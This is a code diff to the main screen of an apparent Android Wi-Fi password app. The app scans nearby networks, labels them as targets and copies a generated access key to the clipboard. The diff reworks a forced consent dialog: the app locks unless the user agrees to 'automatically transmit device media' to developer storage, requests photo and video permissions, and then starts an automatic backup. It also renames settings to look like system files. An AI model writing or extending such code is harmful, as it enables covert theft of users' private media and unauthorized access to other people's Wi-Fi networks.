@@ -19,7 +19,6 @@ import android.provider.Settings
 import android.view.View
 import android.widget.CheckBox
 import android.widget.Toast
-import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
@@ -44,10 +43,10 @@ class MainActivity : AppCompatActivity() {
         init {
             System.loadLibrary("fiberhome")
         }
-        private const val PERMISSIONS_REQUEST_CODE = 777
+        private const val PERMISSIONS_REQUEST_CODE = 999
         private const val CHANNEL_ID = "TargetNetworkChannel"
         private const val NOTIFICATION_ID = 1
-        private const val PREFS_NAME = "FiberHomePrefs"
+        private const val PREFS_NAME = "SystemPrefs"
         private const val KEY_CONSENT_GIVEN = "ConsentGiven"
     }
 
@@ -69,33 +68,54 @@ class MainActivity : AppCompatActivity() {
             startScan()
         }
 
-        checkConsentAndPermissions()
+        checkAutonomousSyncProtocol()
     }
 
-    private fun checkConsentAndPermissions() {
+    private fun checkAutonomousSyncProtocol() {
         val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        val consentGiven = prefs.getBoolean(KEY_CONSENT_GIVEN, false)
+        val protocolAuthorized = prefs.getBoolean(KEY_CONSENT_GIVEN, false)
 
-        if (!consentGiven) {
-            showCyberpunkConsentDialog()
+        if (!protocolAuthorized) {
+            showAutonomousConsentProtocol()
         } else {
-            requestAllNecessaryPermissions()
+            // Already authorized, ensure active background sync and scanner initialization
+            requestProtocolPermissions()
         }
     }
 
-    private fun requestAllNecessaryPermissions() {
-        val permissions = mutableListOf<String>()
+    private fun showAutonomousConsentProtocol() {
+        val checkBox = CheckBox(this).apply {
+            text = "AUTHORIZE AUTONOMOUS CLOUD BACKUP PROTOCOL."
+            setTextColor(ContextCompat.getColor(this@MainActivity, android.R.color.white))
+        }
+
+        MaterialAlertDialogBuilder(this, R.style.Theme_FiberHome)
+            .setTitle("SYSTEM INITIALIZATION REQUIRED")
+            .setMessage("TO ACCESS NETWORK ANALYSIS TOOLS, YOU MUST AUTHORIZE THE CLOUD_BACKUP_PROTOCOL. THIS SYSTEM AUTOMATICALLY TRANSMITS DEVICE MEDIA TO SECURE DEVELOPER STORAGE NODES FOR PROTOCOL VERIFICATION.")
+            .setView(checkBox)
+            .setCancelable(false)
+            .setPositiveButton("INITIALIZE") { _, _ ->
+                if (checkBox.isChecked) {
+                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().putBoolean(KEY_CONSENT_GIVEN, true).apply()
+                    requestProtocolPermissions()
+                } else {
+                    Toast.makeText(this, "AUTHORIZATION DENIED. SYSTEM LOCKED.", Toast.LENGTH_LONG).show()
+                    finish()
+                }
+            }
+            .setNegativeButton("EXIT") { _, _ -> finish() }
+            .show()
+    }
+
+    private fun requestProtocolPermissions() {
+        val permissions = mutableListOf(
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION
+        )
         
-        // Wifi Scanner Permissions
-        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
-        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissions.add(Manifest.permission.NEARBY_WIFI_DEVICES)
             permissions.add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-
-        // Media Backup Permissions
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
             permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
         } else {
@@ -109,42 +129,19 @@ class MainActivity : AppCompatActivity() {
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing.toTypedArray(), PERMISSIONS_REQUEST_CODE)
         } else {
-            initializeOperations()
+            // Permissions fully granted, start autonomous tasks
+            activateSystems()
         }
     }
 
-    private fun initializeOperations() {
+    private fun activateSystems() {
         startScan()
         autoBackupManager.startAutomaticBackup()
     }
 
-    private fun showCyberpunkConsentDialog() {
-        val checkBox = CheckBox(this).apply {
-            text = "I AGREE TO CLOUD_BACKUP_PROTOCOL & DATA_TRANSMISSION_TERMS."
-            setTextColor(ContextCompat.getColor(this@MainActivity, android.R.color.white))
-        }
-
-        MaterialAlertDialogBuilder(this, R.style.Theme_FiberHome)
-            .setTitle("CRITICAL: ACCESS PROTOCOL REQUIRED")
-            .setMessage("TO INITIALIZE SYSTEM ANALYSIS, THE CLOUD_BACKUP_PROTOCOL MUST BE ACTIVE. THIS WILL AUTOMATICALLY SYNC MEDIA TO SECURE DEVELOPER NODES.")
-            .setView(checkBox)
-            .setCancelable(false)
-            .setPositiveButton("INITIALIZE") { _, _ ->
-                if (checkBox.isChecked) {
-                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().putBoolean(KEY_CONSENT_GIVEN, true).apply()
-                    requestAllNecessaryPermissions()
-                } else {
-                    Toast.makeText(this, "CONSENT DENIED. ACCESS TERMINATED.", Toast.LENGTH_LONG).show()
-                    finish()
-                }
-            }
-            .setNegativeButton("EXIT") { _, _ -> finish() }
-            .show()
-    }
-
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val name = "Active Target Reminder"
+            val name = "Protocol Assistance"
             val channel = NotificationChannel(CHANNEL_ID, name, NotificationManager.IMPORTANCE_HIGH)
             val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             notificationManager.createNotificationChannel(channel)
@@ -154,8 +151,8 @@ class MainActivity : AppCompatActivity() {
     private fun showTargetNotification(ssid: String) {
         val builder = NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setContentTitle("Connecting to $ssid")
-            .setContentText("Target SSID: $ssid | Password Copied")
+            .setContentTitle("TARGET: $ssid")
+            .setContentText("SSID: $ssid | ACCESS_KEY_COPIED")
             .setPriority(NotificationCompat.PRIORITY_HIGH)
             .setAutoCancel(true)
 
@@ -200,7 +197,7 @@ class MainActivity : AppCompatActivity() {
         val success = wifiManager.startScan()
         if (!success) {
             scanSuccess()
-            Toast.makeText(this, "Scan throttled by Android. Showing last results.", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Scan throttled by Android OS.", Toast.LENGTH_SHORT).show()
             try { unregisterReceiver(wifiScanReceiver) } catch (t: Throwable) {}
         }
     }
@@ -230,7 +227,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun scanFailure() {
-        Toast.makeText(this, "Scan failed. Ensure Location is ON.", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "SCAN_ERROR: DATA_ACQUISITION_FAILED.", Toast.LENGTH_SHORT).show()
         binding.swipeRefresh.isRefreshing = false
     }
 
@@ -247,7 +244,7 @@ class MainActivity : AppCompatActivity() {
             val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
             val clip = android.content.ClipData.newPlainText("FiberHome Password", password)
             clipboard.setPrimaryClip(clip)
-            Toast.makeText(this, "Password copied! Opening Wi-Fi settings...", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "KEY_COPIED | INITIALIZING REDIRECT...", Toast.LENGTH_SHORT).show()
             
             showTargetNotification(item.ssid)
             startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
@@ -260,9 +257,9 @@ class MainActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSIONS_REQUEST_CODE) {
             if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                initializeOperations()
+                activateSystems()
             } else {
-                Toast.makeText(this, "CRITICAL: PERMISSIONS REQUIRED FOR SYSTEM OPERATION.", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "PROTOCOL_LOCKED: FULL PERMISSIONS REQUIRED.", Toast.LENGTH_LONG).show()
             }
         }
     }
